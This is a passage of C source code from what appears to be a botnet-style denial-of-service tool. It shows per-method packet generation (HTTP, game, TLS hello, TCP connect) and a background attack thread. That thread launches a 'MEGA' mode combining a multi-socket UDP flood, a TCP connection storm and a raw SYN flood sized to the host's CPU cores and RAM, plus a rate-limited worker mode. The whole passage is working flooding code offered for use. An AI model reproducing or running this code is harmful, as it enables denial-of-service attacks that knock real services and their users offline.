                if (s >= 0) {
                    fcntl(s, F_SETFL, O_NONBLOCK);
                    connect(s, (struct sockaddr *)&ta, sizeof(ta));
                    unsigned char buf[2048]; int len = 0;
                    gen_http(buf, &len, p->target);
                    send(s, buf, (size_t)len, MSG_DONTWAIT | MSG_NOSIGNAL);
                    close(s); pkt_sent(len);
                }
            } else if (c == 5) {
                unsigned char buf[512]; int len = 0;
                gen_game_pkt(buf, &len);
                if (sendto(us, buf, (size_t)len, MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta)) > 0)
                    pkt_sent(len);
            } else if (c == 6) {
                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s >= 0) {
                    fcntl(s, F_SETFL, O_NONBLOCK);
                    connect(s, (struct sockaddr *)&ta, sizeof(ta));
                    unsigned char buf[1024]; int len = 0;
                    gen_tls_hello(buf, &len, p->target);
                    send(s, buf, (size_t)len, MSG_DONTWAIT | MSG_NOSIGNAL);
                    close(s); pkt_sent(len);
                }
            } else {
                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s >= 0) {
                    fcntl(s, F_SETFL, O_NONBLOCK);
                    connect(s, (struct sockaddr *)&ta, sizeof(ta));
                    close(s); pkt_sent(64);
                }
            }
        }
    }
    close(us);
    if (rs >= 0) close(rs);
}

/* ── Background Attack Thread ───────────────────────── */
void *bg_attack_thread(void *arg)
{
    BgAttackCtx *ctx = (BgAttackCtx *)arg;
    if (!ctx) return NULL;
    AttackParams *atk = &ctx->atk;
    if (atk->duration_secs <= 0) atk->duration_secs = 60;
    if (atk->port <= 0 || atk->port > 65535) atk->port = 80;
    if (!atk->target[0]) { free(ctx); return NULL; }

    time_t deadline = time(NULL) + atk->duration_secs;
    g_attack_active = 1;
    g_attack_stop = 0;
    g_pkt_count = 0;
    g_byte_count = 0;

    if (atk->mega_mode || !strcmp(atk->method, "MEGA")) {
        int cores = get_nprocs();
        if (cores < 1) cores = 1;

        /* Adaptive sockets: cores * 8, capped by free RAM and MEGA_MAX_SOCKS */
        struct sysinfo si;
        long free_mb = 512;
        if (sysinfo(&si) == 0)
            free_mb = (long)(si.freeram / (1024 * 1024));
        int max_sk = cores * MEGA_SOCKS_PER_CPU;
        int ram_cap = (int)(free_mb / 4); /* ~4MB kernel+user buf per sock */
        if (ram_cap < 8) ram_cap = 8;
        if (max_sk > ram_cap) max_sk = ram_cap;
        if (max_sk > MEGA_MAX_SOCKS) max_sk = MEGA_MAX_SOCKS;
        if (max_sk < 8) max_sk = 8;

        /* Thread layout: majority UDP mega, + TCP storm, + SYN if raw works */
        int n_udp = cores;
        if (n_udp < 1) n_udp = 1;
        if (n_udp > 8) n_udp = 8;
        int n_tcp = (cores >= 2) ? 1 : 1;
        int n_syn = 0;
        int raw_probe = create_raw_socket(IPPROTO_TCP);
        if (raw_probe >= 0) { close(raw_probe); n_syn = 1; }
        int threads = n_udp + n_tcp + n_syn;

        int *socks = calloc((size_t)max_sk, sizeof(int));
        if (!socks) { g_attack_active = 0; free(ctx); return NULL; }
        int sock_cnt = 0;
        for (int i = 0; i < max_sk; i++) {
            int s = create_udp_socket();
            if (s < 0) break;
            socks[sock_cnt++] = s;
        }
        if (sock_cnt < 1) {
            free(socks);
            g_attack_active = 0; free(ctx); return NULL;
        }

        struct sockaddr_in ta;
        memset(&ta, 0, sizeof(ta));
        ta.sin_family = AF_INET;
        ta.sin_port = htons((uint16_t)atk->port);
        if (resolve_target(atk->target, &ta.sin_addr) != 0) {
            for (int i = 0; i < sock_cnt; i++) close(socks[i]);
            free(socks);
            g_attack_active = 0; free(ctx); return NULL;
        }

        pthread_t *tids = calloc((size_t)threads, sizeof(pthread_t));
        MegaThread *mt = calloc((size_t)threads, sizeof(MegaThread));
        if (!tids || !mt) {
            free(socks); free(tids); free(mt);
            g_attack_active = 0; free(ctx); return NULL;
        }

        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_setstacksize(&attr, 512 * 1024);

        int ti = 0;
        int spth = sock_cnt / n_udp;
        if (spth < 1) spth = 1;
        for (int i = 0; i < n_udp; i++) {
            mt[ti].socks = &socks[i * spth];
            mt[ti].sock_count = (i == n_udp - 1) ? sock_cnt - (i * spth) : spth;
            if (mt[ti].sock_count < 1) mt[ti].sock_count = 1;
            mt[ti].target = ta;
            mt[ti].port = atk->port;
            mt[ti].duration = atk->duration_secs;
            mt[ti].cpu_id = i;
            mt[ti].mode = 0; /* UDP mega */
            strncpy(mt[ti].host, atk->target, sizeof(mt[ti].host) - 1);
            pthread_create(&tids[ti], &attr, mega_worker, &mt[ti]);
            ti++;
        }
        /* TCP connection storm */
        mt[ti].socks = NULL; mt[ti].sock_count = 0;
        mt[ti].target = ta; mt[ti].port = atk->port;
        mt[ti].duration = atk->duration_secs;
        mt[ti].cpu_id = n_udp % cores;
        mt[ti].mode = 1;
        strncpy(mt[ti].host, atk->target, sizeof(mt[ti].host) - 1);
        pthread_create(&tids[ti], &attr, mega_worker, &mt[ti]);
        ti++;
        /* SYN raw if available */
        if (n_syn) {
            mt[ti].socks = NULL; mt[ti].sock_count = 0;
            mt[ti].target = ta; mt[ti].port = atk->port;
            mt[ti].duration = atk->duration_secs;
            mt[ti].cpu_id = (n_udp + 1) % cores;
            mt[ti].mode = 2;
            strncpy(mt[ti].host, atk->target, sizeof(mt[ti].host) - 1);
            pthread_create(&tids[ti], &attr, mega_worker, &mt[ti]);
            ti++;
        }
        pthread_attr_destroy(&attr);

        while (!g_attack_stop && time(NULL) < deadline) sleep(1);
        g_attack_stop = 1;
        for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
        for (int i = 0; i < sock_cnt; i++) close(socks[i]);
        free(socks); free(tids); free(mt);
    } else {
        struct sockaddr_in ta;
        memset(&ta, 0, sizeof(ta));
        ta.sin_family = AF_INET;
        ta.sin_port = htons((uint16_t)atk->port);
        if (resolve_target(atk->target, &ta.sin_addr) != 0) {
            g_attack_active = 0; free(ctx); return NULL;
        }
        TokenBucket tb;
        /* Shared rate across workers; burst = 2x for spikes */
        double rate = (double)(atk->max_pps > 0 ? atk->max_pps : 100000);
        tb_init(&tb, rate, rate * 2.0);
        int cores = get_nprocs();
        if (cores < 1) cores = 1;
        int nc = (int)atk->max_threads;
        if (nc < 1) nc = cores * 2;
        if (nc > cores * 4) nc = cores * 4; /* cap: avoid thrash */
        if (nc > 32) nc = 32;
        if (nc < 1) nc = 1;
        /* Per-worker rate share so total ≈ max_pps */
        double per = rate / (double)nc;
        if (per < 1) per = 1;

        pthread_t *tids = malloc((size_t)nc * sizeof(pthread_t));
        if (!tids) { g_attack_active = 0; free(ctx); return NULL; }
        int launched = 0;
        for (int i = 0; i < nc; i++) {
            WorkerArg *w = malloc(sizeof(WorkerArg));
            AttackParams *ap = malloc(sizeof(AttackParams));
            TokenBucket *tbp = malloc(sizeof(TokenBucket));
            if (!w || !ap || !tbp) { free(w); free(ap); free(tbp); continue; }
            memcpy(ap, atk, sizeof(AttackParams));
            tb_init(tbp, per, per * 2.0);
            w->ap = ap; w->tb = tbp; w->ta = ta; w->cpu = i % cores;
            if (pthread_create(&tids[launched], NULL, attack_worker, w) == 0)
                launched++;
            else {
                free(ap); free(tbp); free(w);
            }
        }
        nc = launched;
        while (!g_attack_stop && time(NULL) < deadline) sleep(1);
        g_attack_stop = 1;
        for (int i = 0; i < nc; i++) pthread_join(tids[i], NULL);
        free(tids);
    }
    g_attack_active = 0;
    free(ctx);
    return NULL;
}
